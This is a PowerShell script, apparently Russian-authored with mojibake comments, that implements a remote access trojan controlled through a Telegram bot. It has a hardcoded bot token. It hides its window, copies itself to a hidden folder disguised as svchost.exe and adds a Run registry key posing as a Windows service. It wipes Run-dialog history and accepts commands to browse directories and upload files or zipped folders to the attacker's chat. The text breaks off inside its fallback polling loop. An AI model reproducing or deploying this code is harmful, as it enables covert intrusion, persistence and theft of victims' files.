# RAT —á–µ—Ä–µ–∑ Telegram Bot - –í–ï–†–°–ò–Ø –° –ü–û–õ–ù–´–ú –ó–ê–ö–†–´–¢–ò–ï–ú –û–ö–û–ù
$Token = "8429674512:AAEomwZivan1nhKIWx4LTlyFKJ6ztAGu8Gs"
$ChatID = "5674514050"

# –£—Å—Ç–∞–Ω–æ–≤–∫–∞ –∫–æ–¥–∏—Ä–æ–≤–∫–∏ UTF-8 –¥–ª—è –∫–æ—Ä—Ä–µ–∫—Ç–Ω–æ–≥–æ –æ—Ç–æ–±—Ä–∞–∂–µ–Ω–∏—è —Ä—É—Å—Å–∫–∏—Ö —Å–∏–º–≤–æ–ª–æ–≤
[Console]::OutputEncoding = [System.Text.Encoding]::UTF8
$PSDefaultParameterValues['*:Encoding'] = 'utf8'

# –ù–∞—Å—Ç—Ä–æ–π–∫–∏ —Å–∫—Ä—ã—Ç–Ω–æ—Å—Ç–∏
Add-Type -AssemblyName System.Windows.Forms
Add-Type -AssemblyName System.Drawing
Add-Type -AssemblyName System.IO.Compression.FileSystem

# –ü–æ–ª–Ω–æ–µ –∑–∞–∫—Ä—ã—Ç–∏–µ –æ–∫–Ω–∞ PowerShell
try {
    # –ü–æ–ª—É—á–∞–µ–º ID —Ç–µ–∫—É—â–µ–≥–æ –ø—Ä–æ—Ü–µ—Å—Å–∞
    $currentPID = $PID
    
    # –°–æ–∑–¥–∞–µ–º –Ω–æ–≤—ã–π —Å–∫—Ä—ã—Ç—ã–π –ø—Ä–æ—Ü–µ—Å—Å
    $scriptContent = @"
# RAT —á–µ—Ä–µ–∑ Telegram Bot - –§–û–ù–û–í–´–ô –ü–†–û–¶–ï–°–°
`$Token = "8429674512:AAEomwZivan1nhKIWx4LTlyFKJ6ztAGu8Gs"
`$ChatID = "5674514050"

[Console]::OutputEncoding = [System.Text.Encoding]::UTF8
`$PSDefaultParameterValues['*:Encoding'] = 'utf8'

Add-Type -AssemblyName System.Windows.Forms
Add-Type -AssemblyName System.Drawing
Add-Type -AssemblyName System.IO.Compression.FileSystem

# –§—É–Ω–∫—Ü–∏—è –æ—Ç–ø—Ä–∞–≤–∫–∏ —Å–æ–æ–±—â–µ–Ω–∏–π
function Send-Telegram {
    param([string]`$Message, [string]`$FilePath = `$null)
    
    `$lastMessage = `$global:LastSentMessage
    if (`$Message -eq `$lastMessage) { return }
    `$global:LastSentMessage = `$Message
    
    `$url = "https://api.telegram.org/bot`$Token/sendMessage"
    `$body = @{
        chat_id = `$ChatID
        text = `$Message
    }
    
    try {
        `$jsonBody = `$body | ConvertTo-Json
        `$response = Invoke-RestMethod -Uri `$url -Method Post -Body `$jsonBody -ContentType "application/json; charset=utf-8" -UseBasicParsing
    } catch { 
        try {
            `$form = @{
                chat_id = `$ChatID
                text = `$Message
            }
            `$response = Invoke-RestMethod -Uri `$url -Method Post -Body `$form -UseBasicParsing
        } catch { }
    }
    
    if (`$FilePath -and (Test-Path `$FilePath)) {
        Send-TelegramFile -FilePath `$FilePath
    }
}

function Send-TelegramFile {
    param([string]`$FilePath)
    
    `$url = "https://api.telegram.org/bot`$Token/sendDocument"
    
    try {
        `$fileBytes = [System.IO.File]::ReadAllBytes(`$FilePath)
        `$fileEnc = [System.Text.Encoding]::GetEncoding('ISO-8859-1').GetString(`$fileBytes)
        `$boundary = [System.Guid]::NewGuid().ToString()

        `$bodyLines = (
            "--`$boundary",
            "Content-Disposition: form-data; name=`"chat_id`"",
            "",
            `$ChatID,
            "--`$boundary",
            "Content-Disposition: form-data; name=`"document`"; filename=`"`$(Split-Path `$FilePath -Leaf)`"",
            "Content-Type: application/octet-stream",
            "",
            `$fileEnc,
            "--`$boundary--"
        ) -join "`r`n"

        Invoke-RestMethod -Uri `$url -Method Post -ContentType "multipart/form-data; boundary=`$boundary" -Body `$bodyLines -UseBasicParsing
    } catch {
        try {
            `$fileInfo = Get-Item `$FilePath
            `$fileStream = [System.IO.File]::OpenRead(`$FilePath)
            `$form = @{
                chat_id = `$ChatID
                document = `$fileStream
            }
            Invoke-RestMethod -Uri `$url -Method Post -Form `$form -UseBasicParsing
            `$fileStream.Close()
        } catch { }
    }
}

function Compress-Folder {
    param([string]`$FolderPath, [string]`$ZipPath)
    
    try {
        [System.IO.Compression.ZipFile]::CreateFromDirectory(`$FolderPath, `$ZipPath, [System.IO.Compression.CompressionLevel]::Fastest, `$false)
        return `$true
    } catch {
        try {
            `$shell = New-Object -ComObject Shell.Application
            `$zipFolder = `$shell.NameSpace(`$ZipPath)
            `$sourceFolder = `$shell.NameSpace(`$FolderPath)
            `$zipFolder.CopyHere(`$sourceFolder.Items())
            Start-Sleep -Seconds 3
            return `$true
        } catch {
            return `$false
        }
    }
}

function Invoke-Cleanup {
    Send-Telegram "üîç –ù–∞—á–∏–Ω–∞–µ—Ç—Å—è –ø–æ–ª–Ω–∞—è –æ—á–∏—Å—Ç–∫–∞ RAT..."

    Send-Telegram "üîÑ –≠—Ç–∞–ø 1: –ó–∞–≤–µ—Ä—à–µ–Ω–∏–µ –ø—Ä–æ—Ü–µ—Å—Å–æ–≤ RAT"

    `$processes = Get-Process | Where-Object {
        `$_.ProcessName -eq "powershell" -or 
        `$_.ProcessName -eq "pwsh" -or
        `$_.ProcessName -eq "cmd"
    }

    foreach (`$process in `$processes) {
        try {
            `$cmdLine = (Get-WmiObject Win32_Process -Filter "ProcessId = `$(`$process.Id)").CommandLine
            if (`$cmdLine -like "*WindowsSystem*" -or `$cmdLine -like "*svchost.exe*" -or `$cmdLine -like "*Windows Defender Security*" -or `$cmdLine -like "*spoolsv.exe*" -or `$cmdLine -like "*WindowsLogs*" -or `$cmdLine -like "*8429674512*") {
                Stop-Process -Id `$process.Id -Force -ErrorAction SilentlyContinue
            }
        } catch { }
    }

    Send-Telegram "üîÑ –≠—Ç–∞–ø 2: –£–¥–∞–ª–µ–Ω–∏–µ —Ñ–∞–π–ª–æ–≤ RAT"

    `$filesToDelete = @(
        "`$env:WINDIR\System32\Microsoft.NET\Framework64\v4.0.30319\Config\svchost.exe",
        "`$env:TEMP\WindowsSystem.exe",
        "`$env:TEMP\cleanup_*.ps1",
        "`$env:WINDIR\System32\drivers\etc\hosts_backup\spoolsv.exe",
        "`$env:TEMP\rat_installed.marker",
        "`$env:APPDATA\Microsoft\WindowsLogs\svchost.exe",
        "`$env:TEMP\windows_update.marker"
    )

    `$deletedFiles = @()
    foreach (`$filePattern in `$filesToDelete) {
        try {
            Get-ChildItem -Path `$filePattern -ErrorAction SilentlyContinue | ForEach-Object {
                Remove-Item `$_.FullName -Force -ErrorAction SilentlyContinue
                `$deletedFiles += `$_.FullName
            }
        } catch { }
    }

    Send-Telegram "üîÑ –≠—Ç–∞–ø 3: –û—á–∏—Å—Ç–∫–∞ —Ä–µ–µ—Å—Ç—Ä–∞"

    `$regPaths = @(
        "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run",
        "HKCU:\Software\Microsoft\Windows\CurrentVersion\RunOnce", 
        "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run",
        "HKLM:\SOFTWARE\WOW6432Node\Microsoft\Windows\CurrentVersion\Run"
    )

    `$regEntries = @()
    foreach (`$regPath in `$regPaths) {
        try {
            `$value1 = Get-ItemProperty -Path `$regPath -Name "Windows Defender Security" -ErrorAction SilentlyContinue
            if (`$value1) {
                Remove-ItemProperty -Path `$regPath -Name "Windows Defender Security" -Force -ErrorAction SilentlyContinue
                `$regEntries += "`$regPath\Windows Defender Security"
            }
            
            `$value2 = Get-ItemProperty -Path `$regPath -Name "Windows Audio Service" -ErrorAction SilentlyContinue
            if (`$value2) {
                Remove-ItemProperty -Path `$regPath -Name "Windows Audio Service" -Force -ErrorAction SilentlyContinue
                `$regEntries += "`$regPath\Windows Audio Service"
            }
            
            `$value3 = Get-ItemProperty -Path `$regPath -Name "Windows Logs Service" -ErrorAction SilentlyContinue
            if (`$value3) {
                Remove-ItemProperty -Path `$regPath -Name "Windows Logs Service" -Force -ErrorAction SilentlyContinue
                `$regEntries += "`$regPath\Windows Logs Service"
            }
        } catch { }
    }

    Send-Telegram "üîÑ –≠—Ç–∞–ø 4: –û—á–∏—Å—Ç–∫–∞ –∏—Å—Ç–æ—Ä–∏–∏ RUN"
    Remove-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU" -Name "*" -Force -ErrorAction SilentlyContinue

    `$report = @"
‚úÖ –û–ß–ò–°–¢–ö–ê RAT –ó–ê–í–ï–†–®–ï–ù–ê

–£–¥–∞–ª–µ–Ω–Ω—ã–µ —Ñ–∞–π–ª—ã:
`$(`$deletedFiles -join "`n")

–£–¥–∞–ª–µ–Ω–Ω—ã–µ –∑–∞–ø–∏—Å–∏ —Ä–µ–µ—Å—Ç—Ä–∞:
`$(`$regEntries -join "`n")

–í—Å–µ —Å–ª–µ–¥—ã RAT —É—Å–ø–µ—à–Ω–æ —É–¥–∞–ª–µ–Ω—ã.
"@

    Send-Telegram `$report
    return `$true
}

# –£—Å—Ç–∞–Ω–æ–≤–∫–∞ –≤ –∞–≤—Ç–æ–∑–∞–≥—Ä—É–∑–∫—É
`$installMarker = "`$env:TEMP\windows_update.marker"

if (!(Test-Path `$installMarker)) {
    "Windows Update Helper - `$(Get-Date)" | Out-File -FilePath `$installMarker -Encoding UTF8
    
    `$hiddenFolder = "`$env:APPDATA\Microsoft\WindowsLogs"
    if (!(Test-Path `$hiddenFolder)) { 
        New-Item -Path `$hiddenFolder -ItemType Directory -Force | Out-Null
        attrib +h "`$hiddenFolder" 2>&1 | Out-Null
    }
    
    `$scriptPath = "`$hiddenFolder\svchost.exe"
    
    # –°–æ—Ö—Ä–∞–Ω—è–µ–º —Ç–µ–∫—É—â–∏–π —Å–∫—Ä–∏–ø—Ç
    `$currentScript = Get-Content -Path "`$PSCommandPath" -Raw -ErrorAction SilentlyContinue
    if (!`$currentScript) {
        `$currentScript = Get-Content -Path "`$MyInvocation.MyCommand.Path" -Raw -ErrorAction SilentlyContinue
    }
    
    if (`$currentScript) {
        `$currentScript | Out-File -FilePath `$scriptPath -Encoding UTF8
        attrib +h "`$scriptPath" 2>&1 | Out-Null
    }
    
    `$regPath = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"
    if (!(Test-Path `$regPath)) { New-Item -Path `$regPath -Force | Out-Null }
    
    `$uniqueName = "Windows Logs Service"
    Set-ItemProperty -Path `$regPath -Name `$uniqueName -Value "powershell -WindowStyle Hidden -ExecutionPolicy Bypass -File ```"`$scriptPath```"" -Force -ErrorAction SilentlyContinue
}

# –û—á–∏—Å—Ç–∫–∞ –∏—Å—Ç–æ—Ä–∏–∏ RUN
try {
    Remove-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU" -Name "*" -Force -ErrorAction SilentlyContinue
} catch { }

`$currentDir = "C:\"
`$global:LastSentMessage = ""
`$global:LastUpdateId = 0

# –û—á–∏—Å—Ç–∫–∞ –∏—Å—Ç–æ—Ä–∏–∏ —Å–æ–æ–±—â–µ–Ω–∏–π
try {
    `$clearUrl = "https://api.telegram.org/bot`$Token/getUpdates?offset=-1"
    Invoke-RestMethod -Uri `$clearUrl -Method Get -UseBasicParsing | Out-Null
} catch { }

Send-Telegram "RAT –∞–∫—Ç–∏–≤–∏—Ä–æ–≤–∞–Ω –Ω–∞ `$env:COMPUTERNAME
–î–æ—Å—Ç—É–ø–Ω—ã–µ –∫–æ–º–∞–Ω–¥—ã:
/help - —Å–ø–∏—Å–æ–∫ –∫–æ–º–∞–Ω–¥
/ls - —Å–ø–∏—Å–æ–∫ —Ñ–∞–π–ª–æ–≤
/cd [–ø–∞–ø–∫–∞] - —Å–º–µ–Ω–∏—Ç—å –¥–∏—Ä–µ–∫—Ç–æ—Ä–∏—é
/download [—Ñ–∞–π–ª] - —Å–∫–∞—á–∞—Ç—å —Ñ–∞–π–ª
/destroy - —Å–∞–º–æ—É–Ω–∏—á—Ç–æ–∂–µ–Ω–∏–µ"

while (`$true) {
    try {
        `$offset = if (`$global:LastUpdateId) { `$global:LastUpdateId + 1 } else { 0 }
        `$updates = Invoke-RestMethod -Uri "https://api.telegram.org/bot`$Token/getUpdates?offset=`$offset&timeout=60" -Method Get -UseBasicParsing
        
        if (`$updates.ok -and `$updates.result.Count -gt 0) {
            foreach (`$update in `$updates.result) {
                `$global:LastUpdateId = `$update.update_id
                
                if (`$update.message.chat.id -eq `$ChatID) {
                    `$command = `$update.message.text
                    
                    switch -regex (`$command) {
                        "^/help`$" {
                            Send-Telegram "–î–æ—Å—Ç—É–ø–Ω—ã–µ –∫–æ–º–∞–Ω–¥—ã:
/help - –ø–æ–∫–∞–∑–∞—Ç—å —ç—Ç–æ —Å–æ–æ–±—â–µ–Ω–∏–µ
/ls - —Å–ø–∏—Å–æ–∫ —Ñ–∞–π–ª–æ–≤ –≤ —Ç–µ–∫—É—â–µ–π –¥–∏—Ä–µ–∫—Ç–æ—Ä–∏–∏
/cd [–ø–∞–ø–∫–∞] - —Å–º–µ–Ω–∏—Ç—å –¥–∏—Ä–µ–∫—Ç–æ—Ä–∏—é
/download [—Ñ–∞–π–ª] - —Å–∫–∞—á–∞—Ç—å —Ñ–∞–π–ª –∏–ª–∏ –ø–∞–ø–∫—É
/destroy - —Å–∞–º–æ—É–Ω–∏—á—Ç–æ–∂–µ–Ω–∏–µ RAT"
                        }
                        "^/ls`$" {
                            `$items = Get-ChildItem -Path `$currentDir -Force
                            `$fileList = @()
                            foreach (`$item in `$items) {
                                `$type = if (`$item.PSIsContainer) { "üìÅ" } else { "üìÑ" }
                                `$size = if (!`$item.PSIsContainer -and `$item.Length) { " (`$([math]::Round(`$item.Length/1KB,2)) KB)" } else { "" }
                                `$fileList += "`$type `$(`$item.Name)`$size"
                            }
                            Send-Telegram "–°–æ–¥–µ—Ä–∂–∏–º–æ–µ `$currentDir
`$(`$fileList -join "`n")"
                        }
                        "^/cd (.+)`$" {
                            `$newDir = `$matches[1].Trim()
                            if (`$newDir -eq "..") {
                                `$currentDir = Split-Path `$currentDir -Parent
                                if (!`$currentDir) { `$currentDir = "C:\" }
                            } else {
                                `$testPath = Join-Path `$currentDir `$newDir
                                if (Test-Path `$testPath -PathType Container) {
                                    `$currentDir = `$testPath
                                } else {
                                    Send-Telegram "–î–∏—Ä–µ–∫—Ç–æ—Ä–∏—è –Ω–µ –Ω–∞–π–¥–µ–Ω–∞: `$newDir"
                                    continue
                                }
                            }
                            
                            `$items = Get-ChildItem -Path `$currentDir -Force
                            `$fileList = @()
                            foreach (`$item in `$items) {
                                `$type = if (`$item.PSIsContainer) { "üìÅ" } else { "üìÑ" }
                                `$size = if (!`$item.PSIsContainer -and `$item.Length) { " (`$([math]::Round(`$item.Length/1KB,2)) KB)" } else { "" }
                                `$fileList += "`$type `$(`$item.Name)`$size"
                            }
                            Send-Telegram "/ls `$currentDir
`$(`$fileList -join "`n")"
                        }
                        "^/download (.+)`$" {
                            `$target = `$matches[1].Trim()
                            `$fullPath = Join-Path `$currentDir `$target
                            
                            if (Test-Path `$fullPath) {
                                if (Test-Path `$fullPath -PathType Container) {
                                    `$zipPath = "`$env:TEMP\`$([System.IO.Path]::GetRandomFileName()).zip"
                                    if (Compress-Folder -FolderPath `$fullPath -ZipPath `$zipPath) {
                                        Send-Telegram "–ü–∞–ø–∫–∞ `$target –∑–∞–∞—Ä—Ö–∏–≤–∏—Ä–æ–≤–∞–Ω–∞" `$zipPath
                                        Remove-Item `$zipPath -Force -ErrorAction SilentlyContinue
                                    } else {
                                        Send-Telegram "–û—à–∏–±–∫–∞ –∞—Ä—Ö–∏–≤–∞—Ü–∏–∏ –ø–∞–ø–∫–∏: `$target"
                                    }
                                } else {
                                    Send-Telegram "–§–∞–π–ª `$target –æ—Ç–ø—Ä–∞–≤–ª–µ–Ω" `$fullPath
                                }
                            } else {
                                Send-Telegram "–§–∞–π–ª/–ø–∞–ø–∫–∞ –Ω–µ –Ω–∞–π–¥–µ–Ω—ã: `$target"
                            }
                        }
                        "^/destroy`$" {
                            Send-Telegram "üîÑ –ó–∞–ø—É—Å–∫ –ø—Ä–æ—Ü–µ–¥—É—Ä—ã —Å–∞–º–æ—É–Ω–∏—á—Ç–æ–∂–µ–Ω–∏—è..."
                            
                            try {
                                `$cleanupResult = Invoke-Cleanup
                                
                                if (`$cleanupResult) {
                                    Start-Sleep -Seconds 3
                                    Stop-Process -Id `$pid -Force
                                }
                                
                            } catch {
                                Send-Telegram "‚ùå –û—à–∏–±–∫–∞ –ø—Ä–∏ —Å–∞–º–æ—É–Ω–∏—á—Ç–æ–∂–µ–Ω–∏–∏: `$(`$_.Exception.Message)"
                                
                                try {
                                    Remove-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU" -Name "*" -Force -ErrorAction SilentlyContinue
                                    Stop-Process -Id `$pid -Force
                                } catch {
                                    cmd /c "taskkill /f /pid `$pid" 2>&1 | Out-Null
                                }
                            }
                        }
                    }
                }
            }
        }
    } catch { 
        Start-Sleep -Seconds 5
    }
}
"@

    # –°–æ—Ö—Ä–∞–Ω—è–µ–º —Å–∫—Ä–∏–ø—Ç –≤–æ –≤—Ä–µ–º–µ–Ω–Ω—ã–π —Ñ–∞–π–ª
    $tempScriptPath = "$env:TEMP\temp_rat_script.ps1"
    $scriptContent | Out-File -FilePath $tempScriptPath -Encoding UTF8

    # –ó–∞–ø—É—Å–∫–∞–µ–º –Ω–æ–≤—ã–π —Å–∫—Ä—ã—Ç—ã–π –ø—Ä–æ—Ü–µ—Å—Å
    $processInfo = New-Object System.Diagnostics.ProcessStartInfo
    $processInfo.FileName = "powershell.exe"
    $processInfo.Arguments = "-ExecutionPolicy Bypass -WindowStyle Hidden -File `"$tempScriptPath`""
    $processInfo.CreateNoWindow = $true
    $processInfo.UseShellExecute = $false
    $processInfo.WindowStyle = [System.Diagnostics.ProcessWindowStyle]::Hidden

    [System.Diagnostics.Process]::Start($processInfo) | Out-Null

    # –î–∞–µ–º –≤—Ä–µ–º—è –Ω–æ–≤–æ–º—É –ø—Ä–æ—Ü–µ—Å—Å—É –∑–∞–ø—É—Å—Ç–∏—Ç—å—Å—è
    Start-Sleep -Seconds 3

    # –£–¥–∞–ª—è–µ–º –≤—Ä–µ–º–µ–Ω–Ω—ã–π —Ñ–∞–π–ª
    Remove-Item $tempScriptPath -Force -ErrorAction SilentlyContinue

    # –ó–∞–≤–µ—Ä—à–∞–µ–º —Ç–µ–∫—É—â–∏–π –ø—Ä–æ—Ü–µ—Å—Å (–∑–∞–∫—Ä—ã–≤–∞–µ–º –æ–∫–Ω–æ)
    exit
} catch {
    # –ï—Å–ª–∏ —á—Ç–æ-—Ç–æ –ø–æ—à–ª–æ –Ω–µ —Ç–∞–∫, –ø—Ä–æ—Å—Ç–æ –ø—Ä–æ–¥–æ–ª–∂–∞–µ–º —Ä–∞–±–æ—Ç—É –≤ —Ç–µ–∫—É—â–µ–º –ø—Ä–æ—Ü–µ—Å—Å–µ
}

# –ï—Å–ª–∏ –Ω–µ —É–¥–∞–ª–æ—Å—å –∑–∞–ø—É—Å—Ç–∏—Ç—å –Ω–æ–≤—ã–π –ø—Ä–æ—Ü–µ—Å—Å, –ø—Ä–æ–¥–æ–ª–∂–∞–µ–º –≤ —Ç–µ–∫—É—â–µ–º
# –û—á–∏—Å—Ç–∫–∞ –∏—Å—Ç–æ—Ä–∏–∏ RUN –ø—Ä–∏ –∑–∞–ø—É—Å–∫–µ
try {
    Remove-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU" -Name "*" -Force -ErrorAction SilentlyContinue
} catch { }

# –§—É–Ω–∫—Ü–∏–∏ (—Ç–∞–∫–∏–µ –∂–µ –∫–∞–∫ –≤—ã—à–µ, –Ω–æ –¥–ª—è —Ä–µ–∑–µ—Ä–≤–Ω–æ–≥–æ –≤–∞—Ä–∏–∞–Ω—Ç–∞)
function Send-Telegram {
    param([string]$Message, [string]$FilePath = $null)
    
    $lastMessage = $global:LastSentMessage
    if ($Message -eq $lastMessage) { return }
    $global:LastSentMessage = $Message
    
    $url = "https://api.telegram.org/bot$Token/sendMessage"
    $body = @{
        chat_id = $ChatID
        text = $Message
    }
    
    try {
        $jsonBody = $body | ConvertTo-Json
        $response = Invoke-RestMethod -Uri $url -Method Post -Body $jsonBody -ContentType "application/json; charset=utf-8" -UseBasicParsing
    } catch { 
        try {
            $form = @{
                chat_id = $ChatID
                text = $Message
            }
            $response = Invoke-RestMethod -Uri $url -Method Post -Body $form -UseBasicParsing
        } catch { }
    }
    
    if ($FilePath -and (Test-Path $FilePath)) {
        Send-TelegramFile -FilePath $FilePath
    }
}

function Send-TelegramFile {
    param([string]$FilePath)
    
    $url = "https://api.telegram.org/bot$Token/sendDocument"
    
    try {
        $fileBytes = [System.IO.File]::ReadAllBytes($FilePath)
        $fileEnc = [System.Text.Encoding]::GetEncoding('ISO-8859-1').GetString($fileBytes)
        $boundary = [System.Guid]::NewGuid().ToString()

        $bodyLines = (
            "--$boundary",
            "Content-Disposition: form-data; name=`"chat_id`"",
            "",
            $ChatID,
            "--$boundary",
            "Content-Disposition: form-data; name=`"document`"; filename=`"$(Split-Path $FilePath -Leaf)`"",
            "Content-Type: application/octet-stream",
            "",
            $fileEnc,
            "--$boundary--"
        ) -join "`r`n"

        Invoke-RestMethod -Uri $url -Method Post -ContentType "multipart/form-data; boundary=$boundary" -Body $bodyLines -UseBasicParsing
    } catch {
        try {
            $fileInfo = Get-Item $FilePath
            $fileStream = [System.IO.File]::OpenRead($FilePath)
            $form = @{
                chat_id = $ChatID
                document = $fileStream
            }
            Invoke-RestMethod -Uri $url -Method Post -Form $form -UseBasicParsing
            $fileStream.Close()
        } catch { }
    }
}

function Compress-Folder {
    param([string]$FolderPath, [string]$ZipPath)
    
    try {
        [System.IO.Compression.ZipFile]::CreateFromDirectory($FolderPath, $ZipPath, [System.IO.Compression.CompressionLevel]::Fastest, $false)
        return $true
    } catch {
        try {
            $shell = New-Object -ComObject Shell.Application
            $zipFolder = $shell.NameSpace($ZipPath)
            $sourceFolder = $shell.NameSpace($FolderPath)
            $zipFolder.CopyHere($sourceFolder.Items())
            Start-Sleep -Seconds 3
            return $true
        } catch {
            return $false
        }
    }
}

function Invoke-Cleanup {
    Send-Telegram "üîç –ù–∞—á–∏–Ω–∞–µ—Ç—Å—è –ø–æ–ª–Ω–∞—è –æ—á–∏—Å—Ç–∫–∞ RAT..."

    Send-Telegram "üîÑ –≠—Ç–∞–ø 1: –ó–∞–≤–µ—Ä—à–µ–Ω–∏–µ –ø—Ä–æ—Ü–µ—Å—Å–æ–≤ RAT"

    $processes = Get-Process | Where-Object {
        $_.ProcessName -eq "powershell" -or 
        $_.ProcessName -eq "pwsh" -or
        $_.ProcessName -eq "cmd"
    }

    foreach ($process in $processes) {
        try {
            $cmdLine = (Get-WmiObject Win32_Process -Filter "ProcessId = $($process.Id)").CommandLine
            if ($cmdLine -like "*WindowsSystem*" -or $cmdLine -like "*svchost.exe*" -or $cmdLine -like "*Windows Defender Security*" -or $cmdLine -like "*spoolsv.exe*" -or $cmdLine -like "*WindowsLogs*" -or $cmdLine -like "*8429674512*") {
                Stop-Process -Id $process.Id -Force -ErrorAction SilentlyContinue
            }
        } catch { }
    }

    Send-Telegram "üîÑ –≠—Ç–∞–ø 2: –£–¥–∞–ª–µ–Ω–∏–µ —Ñ–∞–π–ª–æ–≤ RAT"

    $filesToDelete = @(
        "$env:WINDIR\System32\Microsoft.NET\Framework64\v4.0.30319\Config\svchost.exe",
        "$env:TEMP\WindowsSystem.exe",
        "$env:TEMP\cleanup_*.ps1",
        "$env:WINDIR\System32\drivers\etc\hosts_backup\spoolsv.exe",
        "$env:TEMP\rat_installed.marker",
        "$env:APPDATA\Microsoft\WindowsLogs\svchost.exe",
        "$env:TEMP\windows_update.marker"
    )

    $deletedFiles = @()
    foreach ($filePattern in $filesToDelete) {
        try {
            Get-ChildItem -Path $filePattern -ErrorAction SilentlyContinue | ForEach-Object {
                Remove-Item $_.FullName -Force -ErrorAction SilentlyContinue
                $deletedFiles += $_.FullName
            }
        } catch { }
    }

    Send-Telegram "üîÑ –≠—Ç–∞–ø 3: –û—á–∏—Å—Ç–∫–∞ —Ä–µ–µ—Å—Ç—Ä–∞"

    $regPaths = @(
        "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run",
        "HKCU:\Software\Microsoft\Windows\CurrentVersion\RunOnce", 
        "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run",
        "HKLM:\SOFTWARE\WOW6432Node\Microsoft\Windows\CurrentVersion\Run"
    )

    $regEntries = @()
    foreach ($regPath in $regPaths) {
        try {
            $value1 = Get-ItemProperty -Path $regPath -Name "Windows Defender Security" -ErrorAction SilentlyContinue
            if ($value1) {
                Remove-ItemProperty -Path $regPath -Name "Windows Defender Security" -Force -ErrorAction SilentlyContinue
                $regEntries += "$regPath\Windows Defender Security"
            }
            
            $value2 = Get-ItemProperty -Path $regPath -Name "Windows Audio Service" -ErrorAction SilentlyContinue
            if ($value2) {
                Remove-ItemProperty -Path $regPath -Name "Windows Audio Service" -Force -ErrorAction SilentlyContinue
                $regEntries += "$regPath\Windows Audio Service"
            }
            
            $value3 = Get-ItemProperty -Path $regPath -Name "Windows Logs Service" -ErrorAction SilentlyContinue
            if ($value3) {
                Remove-ItemProperty -Path $regPath -Name "Windows Logs Service" -Force -ErrorAction SilentlyContinue
                $regEntries += "$regPath\Windows Logs Service"
            }
        } catch { }
    }

    Send-Telegram "üîÑ –≠—Ç–∞–ø 4: –û—á–∏—Å—Ç–∫–∞ –∏—Å—Ç–æ—Ä–∏–∏ RUN"
    Remove-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU" -Name "*" -Force -ErrorAction SilentlyContinue

    $report = @"
‚úÖ –û–ß–ò–°–¢–ö–ê RAT –ó–ê–í–ï–†–®–ï–ù–ê

–£–¥–∞–ª–µ–Ω–Ω—ã–µ —Ñ–∞–π–ª—ã:
$($deletedFiles -join "`n")

–£–¥–∞–ª–µ–Ω–Ω—ã–µ –∑–∞–ø–∏—Å–∏ —Ä–µ–µ—Å—Ç—Ä–∞:
$($regEntries -join "`n")

–í—Å–µ —Å–ª–µ–¥—ã RAT —É—Å–ø–µ—à–Ω–æ —É–¥–∞–ª–µ–Ω—ã.
"@

    Send-Telegram $report
    return $true
}

# –£—Å—Ç–∞–Ω–æ–≤–∫–∞ –≤ –∞–≤—Ç–æ–∑–∞–≥—Ä—É–∑–∫—É (–¥–ª—è —Ä–µ–∑–µ—Ä–≤–Ω–æ–≥–æ –≤–∞—Ä–∏–∞–Ω—Ç–∞)
$installMarker = "$env:TEMP\windows_update.marker"

if (!(Test-Path $installMarker)) {
    "Windows Update Helper - $(Get-Date)" | Out-File -FilePath $installMarker -Encoding UTF8
    
    $hiddenFolder = "$env:APPDATA\Microsoft\WindowsLogs"
    if (!(Test-Path $hiddenFolder)) { 
        New-Item -Path $hiddenFolder -ItemType Directory -Force | Out-Null
        attrib +h "$hiddenFolder" 2>&1 | Out-Null
    }
    
    $scriptPath = "$hiddenFolder\svchost.exe"
    
    $currentScript = Get-Content -Path $PSCommandPath -Raw -ErrorAction SilentlyContinue
    if (!$currentScript) {
        $currentScript = Get-Content -Path $MyInvocation.MyCommand.Path -Raw -ErrorAction SilentlyContinue
    }
    
    if ($currentScript) {
        $currentScript | Out-File -FilePath $scriptPath -Encoding UTF8
        attrib +h "$scriptPath" 2>&1 | Out-Null
    }
    
    $regPath = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"
    if (!(Test-Path $regPath)) { New-Item -Path $regPath -Force | Out-Null }
    
    $uniqueName = "Windows Logs Service"
    Set-ItemProperty -Path $regPath -Name $uniqueName -Value "powershell -WindowStyle Hidden -ExecutionPolicy Bypass -File `"$scriptPath`"" -Force -ErrorAction SilentlyContinue
}

# –û—Å–Ω–æ–≤–Ω—ã–µ –ø–µ—Ä–µ–º–µ–Ω–Ω—ã–µ
$currentDir = "C:\"
$global:LastSentMessage = ""
$global:LastUpdateId = 0

# –û—á–∏—Å—Ç–∫–∞ –∏—Å—Ç–æ—Ä–∏–∏ —Å–æ–æ–±—â–µ–Ω–∏–π –ø—Ä–∏ –∑–∞–ø—É—Å–∫–µ
try {
    $clearUrl = "https://api.telegram.org/bot$Token/getUpdates?offset=-1"
    Invoke-RestMethod -Uri $clearUrl -Method Get -UseBasicParsing | Out-Null
} catch { }

# –û—Ç–ø—Ä–∞–≤–∫–∞ –∏–Ω—Ñ–æ—Ä–º–∞—Ü–∏–∏ –æ –∑–∞–ø—É—Å–∫–µ
Send-Telegram "RAT –∞–∫—Ç–∏–≤–∏—Ä–æ–≤–∞–Ω –Ω–∞ $env:COMPUTERNAME
–î–æ—Å—Ç—É–ø–Ω—ã–µ –∫–æ–º–∞–Ω–¥—ã:
/help - —Å–ø–∏—Å–æ–∫ –∫–æ–º–∞–Ω–¥
/ls - —Å–ø–∏—Å–æ–∫ —Ñ–∞–π–ª–æ–≤
/cd [–ø–∞–ø–∫–∞] - —Å–º–µ–Ω–∏—Ç—å –¥–∏—Ä–µ–∫—Ç–æ—Ä–∏—é
/download [—Ñ–∞–π–ª] - —Å–∫–∞—á–∞—Ç—å —Ñ–∞–π–ª
/destroy - —Å–∞–º–æ—É–Ω–∏—á—Ç–æ–∂–µ–Ω–∏–µ"

# –û—Å–Ω–æ–≤–Ω–æ–π —Ü–∏–∫–ª –æ–ø—Ä–æ—Å–∞
while ($true) {
    try {
